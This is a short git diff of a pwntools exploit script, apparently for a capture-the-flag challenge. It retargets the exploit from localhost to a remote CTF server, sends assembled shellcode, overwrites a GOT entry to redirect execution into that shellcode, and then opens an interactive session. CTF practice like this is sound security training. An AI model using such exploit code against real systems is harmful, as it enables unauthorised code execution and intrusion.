@@ -7,7 +7,7 @@ context.arch = 'amd64'
 user_adr_str = '0x6010a0'
 user_addr = 0x6010a0
 
-got_addr_str = '0x600ff8'
+got_addr_str = '0x601020'
 # got_addr = 0x600ff8
 # puts_addr = 0x40074
 got_addr = 0x3c4000
@@ -31,11 +31,12 @@ sc2 = asm('''
 #r = remote('csie.ctf.tw', 10129)
 # gdb.attach(103865)
 print(len(sc2))
-r = remote('localhost', 3333)
+r = remote('csie.ctf.tw', 10129)
+# raw_input()
 print(r.read())
 r.sendline('a\0' + sc2)
 print(r.read())
 r.sendline(got_addr_str)
 print(r.read())
-r.sendline(hex(got_addr + puts_addr - user_addr))
+r.sendline(p64(user_addr+2))
 r.interactive()
